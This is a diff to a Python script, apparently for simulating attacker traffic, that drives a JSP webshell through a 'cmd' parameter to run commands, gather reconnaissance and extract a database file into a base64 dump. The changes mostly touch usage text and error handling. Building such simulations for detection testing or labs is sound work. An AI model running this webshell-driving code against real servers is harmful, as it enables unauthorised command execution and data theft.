@@ -41,35 +41,35 @@ def extract_db_file(url, recon_data):
     with open ("db_dump.txt", "w") as f:
         f.write(file_contents)
 
-    
-
-
 def main():
     if len(sys.argv) < 2 or len(sys.argv) > 3:
-        print("Program expects a url as an argument. \nUsage python3 simulate_attacker_traffic.py <url/to/jsp> <repeat_times (optional)>")
+        print("Program expects a url as an argument. \nUsage: python3 simulate_attacker_traffic.py <url/to/jsp> <repeat_times (optional)>")
         sys.exit(1)
     webshell_url = sys.argv[1]
     if len(sys.argv) == 3 and sys.argv[2].isdigit() and int(sys.argv[2]) > 1:
         repeat = int(sys.argv[2])
     else:
-        print(False)
         repeat = 1
     r = requests.get(webshell_url, params={"cmd": "id"})
-    if r.status_code != 200:
+    if r.status_code != 200 or r.text.find("DOCTYPE") != -1:
         print("Provided url seems invalid. Please try again...")
         sys.exit(1)
     else:
         print("Webshell located, performing attack")
-    for i in range(repeat):
-        print("[*] Performing reconnaissance")
-        recon_data = perform_reconnaissance(webshell_url)
-        if recon_data.get("db").index("file") != 0:
-            print("[*] Performing db file extraction")
-            extract_db_file(webshell_url, recon_data)
-        sleep(1)
+    try:
+        for i in range(repeat):
+            print("[*] Performing reconnaissance")
+            recon_data = perform_reconnaissance(webshell_url)
+            if recon_data.get("db").index("file") != 0:
+                print("[*] Performing db file extraction")
+                extract_db_file(webshell_url, recon_data)
+            sleep(1)
+    except:
+        print("There was an error while executing the attack. Exiting...")
+        sys.exit(1)
+    print("Printing reconnaissance data:")
     print(json.dumps(recon_data, indent=2))
-
-    
+    print("DB dump can be found db_dump.txt (base64 encoded)")
 
 if __name__ == '__main__':
     main()
